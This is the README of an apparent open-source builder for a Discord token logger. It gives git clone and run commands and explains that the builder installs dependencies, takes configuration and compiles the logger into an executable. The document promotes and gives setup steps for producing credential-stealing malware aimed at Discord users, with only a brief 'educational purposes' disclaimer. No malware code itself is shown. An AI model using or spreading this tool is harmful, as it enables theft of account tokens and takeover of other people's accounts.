# Discord-Logger-Builder
This open-source Python 3 script is a builder to the very popular token logger that is on my github that many people use.
This is purely for demonstration/educational purposes. I am not responsible for any actions you take with this project.

## Setup

Depending on your python installation your commands may vary. 
Below are the commands needed to set up.
The script was tested in python 3.10.0, on Windows 10/11. This script has not been tested on any other platforms.

Windows:
```
git clone https://github.com/LocalsGitHub/Discord-Logger-Builder.git
cd Discord-Logger-Builder
py builder.py
```
Or you can clone with GitHub Desktop, Open Command prompt, then `py builder.py`.
## Usage

Simply run the builder and it will fetch the needed dependencies and install them. Then the script will prompt you for the configuration and after the configuration is over it will ask if you want to compile to an executable. If yes, it will output an exe in the EXE folder.
